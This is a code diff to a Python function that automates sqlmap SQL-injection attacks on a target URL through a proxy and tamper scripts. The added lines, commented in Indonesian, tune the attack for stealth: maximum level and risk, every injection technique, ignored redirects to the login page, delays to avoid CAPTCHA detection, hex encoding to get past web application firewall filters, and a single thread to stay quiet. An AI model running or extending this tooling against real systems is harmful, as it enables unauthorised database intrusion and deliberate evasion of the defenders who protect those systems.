@@ -48,14 +48,21 @@ def run_sqlmap_auto(target_url):
     # --level=2 to check cookies
     # --technique=B for boolean-blind
     # --not-string to catch the "Redirecting" WAF behavior
+    # 2. Construct Command (Stealth Bypass Mode)
+    # --ignore-redirects: TETAP di target aslinya, jangan mau dibuang ke /sitelogin
+    # --delay=1: Hindari deteksi CAPTCHA dengan jeda 1 detik
+    # --level=3 --risk=3: Tes semua header dan cookie secara mendalam
+    # --no-cast --hex: Hindari fungsi yang sering diblokir WAF
     cmd = f"{SQLMAP_PATH} -u \"{target_url}\" " \
           f"--proxy=\"{proxy}\" " \
           f"--tamper=\"{TAMPER_SCRIPTS}\" " \
-          f"--level=2 --risk=2 " \
-          f"--technique=B " \
+          f"--level=3 --risk=3 " \
+          f"--technique=BEUST " \
           f"--not-string=\"Redirecting\" " \
-          f"--random-agent --no-cast " \
-          f"--batch --threads=5 --timeout=15" 
+          f"--ignore-redirects " \
+          f"--delay=1 " \
+          f"--random-agent --no-cast --hex " \
+          f"--batch --threads=1 --timeout=20" # Threads=1 agar lebih senyap
 
     # 3. Execution
     print(f"\n[*] Executing Command:\n{cmd}\n")
